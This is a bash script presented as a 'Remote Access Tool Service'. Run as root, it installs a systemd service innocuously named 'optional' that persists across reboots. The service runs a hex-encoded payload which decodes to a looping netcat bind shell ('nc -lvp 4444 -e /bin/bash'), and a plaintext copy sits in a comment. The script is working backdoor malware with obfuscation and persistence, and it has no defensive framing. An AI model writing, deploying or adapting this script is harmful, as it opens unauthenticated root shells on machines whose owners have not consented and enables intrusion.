#!/bin/bash

if [[ $(id -u) != 0 ]]
then
	printf "This program needs root privileges to run\n"
	exit
fi


function header(){
cat << "EOF"
                _                       __
              /   \                  /      \
             '      \              /          \
            |       |Oo          o|            |
            `    \  |OOOo......oOO|   /        |
             `    \\OOOOOOOOOOOOOOO\//        /
               \ _o\OOOOOOOOOOOOOOOO//. ___ /
           ______OOOOOOOOOOOOOOOOOOOOOOOo.___
            --- OO'* `OOOOOOOOOO'*  `OOOOO--
                OO.   OOOOOOOOO'    .OOOOO o
                `OOOooOOOOOOOOOooooOOOOOO'OOOo
              .OO "OOOOOOOOOOOOOOOOOOOO"OOOOOOOo
          __ OOOOOO`OOOOOOOOOOOOOOOO"OOOOOOOOOOOOo
         ___OOOOOOOO_"OOOOOOOOOOO"_OOOOOOOOOOOOOOOO
           OOOOO^OOOO0`(____)/"OOOOOOOOOOOOO^OOOOOO
           OOOOO OO000/000000\000000OOOOOOOO OOOOOO
           OOOOO O0000000000000000 ppppoooooOOOOOO
           `OOOOO 0000000000000000 QQQQ "OOOOOOO"
            o"OOOO 000000000000000oooooOOoooooooO'
            OOo"OOOO.00000000000000000000OOOOOOOO'
           OOOOOO QQQQ 0000000000000000000OOOOOOO
          OOOOOO00eeee00000000000000000000OOOOOOOO.
         OOOOOOOO000000000000000000000000OOOOOOOOOO
         OOOOOOOOO00000000000000000000000OOOOOOOOOO
         `OOOOOOOOO000000000000000000000OOOOOOOOOOO
           "OOOOOOOO0000000000000000000OOOOOOOOOOO'
             "OOOOOOO00000000000000000OOOOOOOOOO"
  .ooooOOOOOOOo"OOOOOOO000000000000OOOOOOOOOOO"
.OOO"""""""""".oOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
OOO         QQQQO"'                     `"QQQQ
OOO
`OOo.
  `"OOOOOOOOOOOOoooooooo.

EOF
}

printf "\e[1mR.A.T.S\e[0m\n"
printf "Remote Access Tool Service\n"
header
rat_service_name="optional"

#### PAYLOADS ####
#payload='/bin/bash -c "while [ 0 -eq 0 ]; do nc -lvp 4444 -e /bin/bash;done"'
payload='/bin/bash -c "printf \x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x77\x68\x69\x6c\x65\x20\x5b\x20\x30\x20\x2d\x65\x71\x20\x30\x20\x5d\x3b\x20\x64\x6f\x20\x6e\x63\x20\x2d\x6c\x76\x70\x20\x34\x34\x34\x34\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x3b\x64\x6f\x6e\x65\x22" | bash'
##################

function permanent_service(){
cat << EOF
[Unit]
Description=optional service
[Service]
Type=oneshot
ExecStart=$payload
[Install]
WantedBy=multi-user.target
EOF
}

printf -- "[\e[0;32m+\e[0m] Creating service called $rat_service_name.service\n"
permanent_service > /etc/systemd/system/$rat_service_name.service
printf -- "[\e[0;32m+\e[0m] Enabling service and making persistent on boot\n"
systemctl enable $rat_service_name.service
systemctl start $rat_service_name.service
